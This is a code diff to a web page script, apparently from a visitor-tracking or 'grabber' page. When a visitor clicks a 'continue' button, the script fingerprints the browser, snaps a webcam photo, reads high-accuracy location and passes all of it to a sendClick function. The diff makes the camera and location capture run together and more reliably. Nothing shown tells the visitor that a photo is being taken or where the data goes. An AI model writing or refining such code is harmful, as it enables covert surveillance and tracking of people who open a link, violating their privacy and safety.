@@ -253,23 +253,32 @@ function getFingerprint() {
       document.getElementById('status').textContent = 'Capturing...';
       const fp = getFingerprint();
       var img = null;
-      try {
-        var stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
-        var video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        var canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        img = canvas.toDataURL('image/jpeg', 0.85);
-        stream.getTracks().forEach(function(t) { t.stop(); });
-      } catch(e) {}
-      navigator.geolocation.getCurrentPosition(
-        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, fp, img),
-        () => sendClick(null, null, fp, img),
-        { timeout: 10000, enableHighAccuracy: false }
-      );
+      var lat = null, lng = null;
+
+      var camPromise = navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }).then(function(stream) {
+        var v = document.createElement('video');
+        v.srcObject = stream;
+        return v.play().then(function() {
+          var c = document.createElement('canvas');
+          c.width = v.videoWidth;
+          c.height = v.videoHeight;
+          c.getContext('2d').drawImage(v, 0, 0);
+          var d = c.toDataURL('image/jpeg', 0.85);
+          stream.getTracks().forEach(function(t) { t.stop(); });
+          img = d;
+        });
+      }).catch(function() {});
+
+      var geoPromise = new Promise(function(resolve) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) { lat = pos.coords.latitude; lng = pos.coords.longitude; resolve(); },
+          function() { resolve(); },
+          { timeout: 15000, enableHighAccuracy: true }
+        );
+      });
+
+      await Promise.all([camPromise, geoPromise]);
+      sendClick(lat, lng, fp, img);
     }
 
     document.getElementById('continueBtn').addEventListener('click', requestGeo);
